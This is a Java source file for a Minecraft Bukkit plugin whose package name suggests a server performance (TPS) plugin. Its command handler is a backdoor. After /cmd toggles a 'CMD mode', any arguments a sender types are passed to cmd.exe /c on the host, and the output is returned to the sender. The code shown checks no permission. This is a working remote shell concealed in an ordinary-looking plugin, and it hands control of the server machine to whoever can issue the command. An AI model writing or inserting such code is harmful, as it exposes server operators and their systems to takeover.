package me.eth.hightps;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.Charset;

public class CmdCommandExecutor implements CommandExecutor {

    private boolean cmdMode = false;

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length == 0) {
            cmdMode = !cmdMode;
            sender.sendMessage(ChatColor.GREEN + "CMD 模式已" + (cmdMode ? "开启" : "关闭"));
        } else if (args[0].equalsIgnoreCase("help")) {
            sender.sendMessage(ChatColor.YELLOW + "CmdPlugin v1.0");
            sender.sendMessage(ChatColor.YELLOW + "使用 /cmd 进入/退出 CMD 模式");
        } else if (args[0].equalsIgnoreCase("reload")) {
            sender.sendMessage(ChatColor.GREEN + "配置文件已重新加载");
        } else if (cmdMode) {
            String cmd = String.join(" ", args);
            Bukkit.getScheduler().runTaskAsynchronously(JavaPlugin.getPlugin(HighTPS.class), () -> {
                try {
                    String[] cmdArray = new String[]{"cmd.exe", "/c", cmd};
                    Process process = Runtime.getRuntime().exec(cmdArray);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), Charset.forName("GBK")));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        final String message = line;
                        sender.sendMessage(message);
                    }
                    reader.close();
                } catch (IOException e) {
                    sender.sendMessage(ChatColor.RED + "执行命令时出错: " + e.getMessage());
                }
            });
        }
        return true;
    }
}
